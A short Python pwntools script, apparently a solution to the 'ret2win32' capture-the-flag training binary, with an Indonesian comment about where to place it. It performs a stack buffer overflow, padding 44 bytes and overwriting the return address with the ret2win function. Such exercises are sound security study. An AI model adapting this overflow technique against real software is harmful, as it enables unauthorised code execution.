from pwn import *
#letakkan xploit ditempat yang sama dengan target

e = ELF("./ret2win32")
r = process("./ret2win32")
retwin_func = p64(e.symbols['ret2win'] + 1)
py = "A" * 44
print (py)

r.recvuntil('>')
r.sendline(py.encode() + retwin_func)

print(r.recvline().decode())
print(r.recvline().decode())
print(r.recvline().decode())
